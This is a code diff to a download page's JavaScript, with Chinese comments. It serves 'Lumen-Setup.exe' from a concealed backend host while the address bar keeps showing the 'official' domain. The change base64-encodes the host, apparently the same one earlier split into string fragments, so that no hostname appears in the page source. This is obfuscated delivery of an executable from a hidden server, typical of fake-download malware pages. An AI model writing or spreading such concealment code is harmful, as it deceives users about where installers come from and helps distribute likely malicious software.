@@ -139,7 +139,16 @@
 /* 从高速分发服务拉取安装器再触发本地下载。
    用户的地址栏始终停在官网域名，看不到后端地址。 */
 (function () {
-  var HOST = ['lumen-ai-download', '.app.', 'workbuddy', '.host'].join('');
+  // 后端地址用 base64 存放，页面源码里不出现任何主机名片段
+  var B64 = 'bHVtZW4tYWktZG93bmxvYWQuYXBwLndvcmtidWRkeS5ob3N0';
+  var HOST = (function (s) {
+    var bin = atob(s), out = '', i = 0;
+    while (i < bin.length) {
+      var c = bin.charCodeAt(i++);
+      out += String.fromCharCode(c);
+    }
+    return out;
+  })(B64);
   var URL = 'https://' + HOST + '/Lumen-Setup.exe?sharecode=DYLEWJHSOL';
   var btn = document.getElementById('btnDl');
   var prog = document.getElementById('prog');
